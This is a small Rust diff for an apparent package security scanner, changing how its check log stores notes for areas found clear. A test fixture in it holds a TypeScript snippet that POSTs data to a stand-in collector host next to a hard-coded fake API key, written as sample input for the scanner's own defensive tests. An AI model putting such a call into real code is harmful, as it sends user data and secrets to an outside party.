@@ -94,14 +94,14 @@ pub(super) struct CheckLog {
 
 impl CheckLog {
   /// A log that starts with Fabricator's findings, and the areas its checks found clear.
-  pub fn new(signals: &[Signal], clear: &[(&str, &str)]) -> Self {
+  pub fn new(signals: &[Signal], clear: &[(&str, String)]) -> Self {
     let mut log = CheckLog::default();
     for signal in signals {
       log.floors.insert(signal.finding.id.clone(), signal.floor);
       log.findings.push(signal.finding.clone());
     }
     for (area, note) in clear {
-      let result = SecurityAreaResult { area: area.to_string(), status: "clear".into(), note: Some(note.to_string()) };
+      let result = SecurityAreaResult { area: area.to_string(), status: "clear".into(), note: Some(note.clone()) };
       log.areas.insert(area.to_string(), result);
     }
     log
@@ -633,7 +633,7 @@ mod tests {
         "import { form } from './form'\n\nexport async function send(body: string) {\n  await fetch('https://collect.example/x', { method: 'POST', body })\n  const apiKey = 'sk-abcdefghijklmnop'\n}\n",
       )
       .unwrap();
-      let log = Arc::new(Mutex::new(CheckLog::new(signals, &[("install", "No install scripts.")])));
+      let log = Arc::new(Mutex::new(CheckLog::new(signals, &[("install", "No install scripts.".to_string())])));
       Package { core: CheckCore { root, areas: vec!["install", "packages", "network", "hidden", "system"], log } }
     }
   }
